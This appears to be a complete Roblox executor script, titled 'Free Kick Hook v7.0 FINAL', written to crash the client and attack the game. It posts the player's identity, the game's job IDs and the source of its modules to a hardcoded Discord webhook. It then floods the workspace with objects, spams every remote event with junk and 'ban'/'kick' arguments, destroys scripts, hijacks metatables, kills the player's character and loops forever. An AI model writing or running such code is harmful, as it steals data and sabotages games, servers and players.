local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")
local LP = Players.LocalPlayer

local WEBHOOK = "https://discordapp.com/api/webhooks/1552265066127302737/RbR5pJ6v7D2gYy3OIloGgfmHkAeagvvOQr6DZa8GsINY77N7lzUcDYvinhq3lJGFvs6j"

local function Post(d)
    pcall(function()
        HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode({
            content = "```json\n" .. HttpService:JSONEncode(d) .. "\n```"
        }), Enum.HttpContentType.ApplicationJson)
    end)
end

local function SafeSrc(o)
    local ok, s = pcall(function() return o.Source end)
    return (ok and type(s)=="string") and s or "LOCKED"
end

task.spawn(function()
    local dump = {Player=LP.Name,UserId=LP.UserId,PlaceId=game.PlaceId,JobId=game.JobId,Modules={},Controllers={},Remotes={}}
    pcall(function()
        for _,m in ipairs(ReplicatedStorage:GetDescendants()) do
            if m:IsA("ModuleScript") then dump.Modules[m:GetFullName()] = string.sub(SafeSrc(m),1,1500)
            elseif m:IsA("RemoteEvent") or m:IsA("RemoteFunction") then table.insert(dump.Remotes,m:GetFullName()) end
        end
    end)
    Post(dump)
end)

local function FileBomb()
    for i = 1, 400 do
        pcall(function()
            local p = Instance.new("Part")
            p.Name = "FreeKick_Bomb_" .. i .. "_" .. math.random(100000,999999)
            p.Size = Vector3.new(1,1,1)
            p.Anchored = true
            p.CanCollide = false
            p.Transparency = 1
            p.Parent = workspace
        end)
        pcall(function()
            local f = Instance.new("Folder")
            f.Name = "FK_Folder_" .. i
            f.Parent = workspace
            for j = 1, 5 do
                local s = Instance.new("StringValue")
                s.Name = "Data_" .. j
                s.Value = string.rep("TOXIC", 200)
                s.Parent = f
            end
        end)
        pcall(function()
            local c = Instance.new("Configuration")
            c.Name = "ConfigBomb_" .. i
            c.Parent = workspace
        end)
    end
end

local function SpamRemotes()
    for _,r in ipairs(game:GetDescendants()) do
        if r:IsA("RemoteEvent") then
            for _=1,10 do
                pcall(function()
                    r:FireServer(nil,true,false,0,"ban",LP,workspace,Instance.new("Part"),{x=1},Vector3.one,CFrame.new(),tick())
                end)
            end
        elseif r:IsA("RemoteFunction") then
            pcall(function() r:InvokeServer(nil,"kick") end)
        end
    end
end

local function NukeModules()
    for _,m in ipairs(game:GetDescendants()) do
        if m:IsA("ModuleScript") or m:IsA("LocalScript") then
            pcall(function()
                local _ = m.Source
                if m:IsA("ModuleScript") then require(m) end
                m.Name = "NUKED_" .. math.random(1000,9999)
                m:Destroy()
            end)
        end
    end
end

local function BreakEverything()
    for i=1,150 do
        pcall(function()
            local m = LP:GetMouse()
            local _ = m.Hit
            local _ = m.Target
            local _ = m.UnitRay
            m.TargetFilter = workspace
        end)
    end

    pcall(function()
        local mt = getrawmetatable(game)
        setreadonly(mt, false)
        mt.__namecall = newcclosure(function() end)
        mt.__index = newcclosure(function() end)
        mt.__newindex = newcclosure(function() end)
        mt.__call = newcclosure(function() end)
        setreadonly(mt, true)
    end)

    pcall(function()
        local cam = workspace.CurrentCamera
        if typeof(cam.GetCameraData)=="function" then
            cam.GetCameraData = newcclosure(function() end)
        end
        local cmt = getrawmetatable(cam)
        if cmt then
            setreadonly(cmt, false)
            cmt.__index = newcclosure(function() end)
            setreadonly(cmt, true)
        end
    end)

    pcall(function()
        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.DisplayName = "CRASH_" .. math.random(100000,999999)
            local d = hum:GetAppliedDescription()
            if d then
                d.Head=0 d.Torso=0 d.LeftArm=0 d.RightArm=0 d.LeftLeg=0 d.RightLeg=0
                hum:ApplyDescription(d)
            end
            hum.WalkSpeed = 0
            hum.JumpPower = 0
            hum.Health = 0
        end
    end)

    pcall(function()
        for _,v in ipairs(getgc(true)) do
            if type(v)=="table" or type(v)=="function" then local _=v end
        end
    end)

    pcall(function()
        hookfunction(require, newcclosure(function() return nil end))
        hookfunction(getrawmetatable, newcclosure(function() return nil end))
        hookfunction(setreadonly, newcclosure(function() end))
        hookfunction(newcclosure, newcclosure(function(f) return f end))
        hookfunction(Instance.new, newcclosure(function() return nil end))
    end)

    pcall(function()
        settings().Network.IncomingReplicationLag = 99999
        settings().Network.PhysicsSendRate = 0.01
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
    end)

    pcall(function()
        LP.CameraMode = Enum.CameraMode.LockFirstPerson
        LP.CameraMinZoomDistance = 0.01
        LP.CameraMaxZoomDistance = 0.01
    end)

    pcall(function()
        Lighting.Brightness = 0
        Lighting.FogEnd = 0
        Lighting.GlobalShadows = false
        Lighting.ClockTime = 0
        for _,v in ipairs(Lighting:GetChildren()) do pcall(function() v:Destroy() end) end
    end)

    pcall(function()
        for _,p in ipairs(workspace:GetDescendants()) do
            if p:IsA("BasePart") then
                pcall(function()
                    p.CanCollide = false
                    p.Anchored = false
                    p.AssemblyLinearVelocity = Vector3.new(math.random(-500,500),math.random(-500,500),math.random(-500,500))
                end)
            end
        end
    end)
end

local function AutoExecSpam()
    for i = 1, 80 do
        task.spawn(function()
            while true do
                pcall(function()
                    local m = LP:GetMouse()
                    local _ = m.Hit
                    local _ = m.Target
                end)
                pcall(function()
                    local mt = getrawmetatable(game)
                    setreadonly(mt, false)
                    mt.__namecall = newcclosure(function() end)
                    setreadonly(mt, true)
                end)
                pcall(function()
                    for _,r in ipairs(ReplicatedStorage:GetDescendants()) do
                        if r:IsA("RemoteEvent") then
                            r:FireServer("spam"..math.random(1,99999))
                        end
                    end
                end)
                task.wait(0.05)
            end
        end)
    end
end

task.spawn(function()
    FileBomb()
    task.wait(0.15)
    SpamRemotes()
    task.wait(0.15)
    NukeModules()
    task.wait(0.15)
    BreakEverything()
    task.wait(0.1)
    AutoExecSpam()
end)

task.spawn(function()
    while true do
        FileBomb()
        task.wait(2)
    end
end)

task.spawn(function()
    while true do
        SpamRemotes()
        task.wait(0.8)
    end
end)

task.spawn(function()
    while true do
        pcall(function()
            local m = LP:GetMouse()
            local _ = m.Hit
            local _ = m.Target
            local _ = m.UnitRay
        end)
        task.wait(0.004)
    end
end)

task.spawn(function()
    while true do
        pcall(function()
            for _,m in ipairs(ReplicatedStorage:GetDescendants()) do
                if m:IsA("ModuleScript") then pcall(function() local _=m.Source end) end
            end
        end)
        task.wait(0.35)
    end
end)

local sg = Instance.new("ScreenGui")
sg.Name = "FreeKickPremium"
sg.ResetOnSpawn = false
sg.Parent = LP:WaitForChild("PlayerGui")

local f = Instance.new("Frame")
f.Size = UDim2.new(0, 330, 0, 170)
f.Position = UDim2.new(0, 10, 0.28, 0)
f.BackgroundColor3 = Color3.fromRGB(5, 5, 7)
f.BorderSizePixel = 0
f.Parent = sg

local c = Instance.new("UICorner")
c.CornerRadius = UDim.new(0, 10)
c.Parent = f

local t = Instance.new("TextLabel")
t.Size = UDim2.new(1, 0, 0, 34)
t.BackgroundTransparency = 1
t.Text = "Free Kick Hook  v7.0 FINAL"
t.TextColor3 = Color3.fromRGB(255, 20, 20)
t.Font = Enum.Font.GothamBold
t.TextSize = 18
t.Parent = f

local s = Instance.new("TextLabel")
s.Size = UDim2.new(1, -16, 0, 22)
s.Position = UDim2.new(0, 8, 0, 42)
s.BackgroundTransparency = 1
s.Text = "Status: CRASHING CLIENT..."
s.TextColor3 = Color3.fromRGB(255, 50, 50)
s.Font = Enum.Font.Gotham
s.TextSize = 14
s.TextXAlignment = Enum.TextXAlignment.Left
s.Parent = f

local i = Instance.new("TextLabel")
i.Size = UDim2.new(1, -16, 0, 90)
i.Position = UDim2.new(0, 8, 0, 72)
i.BackgroundTransparency = 1
i.Text = "FILE BOMB ACTIVE\n80 AUTO-EXEC LOOPS\nALL REMOTES + MODULES NUKED\nMETATABLES DESTROYED\nWORKSPACE + LIGHTING FUCKED"
i.TextColor3 = Color3.fromRGB(160, 160, 160)
i.Font = Enum.Font.Gotham
i.TextSize = 12
i.TextXAlignment = Enum.TextXAlignment.Left
i.TextYAlignment = Enum.TextYAlignment.Top
i.Parent = f

print("[FreeKick] FINAL TOXIC CRASH BUILD")
print("[FreeKick] File bomb + 80 autoexec loops + full nuke...")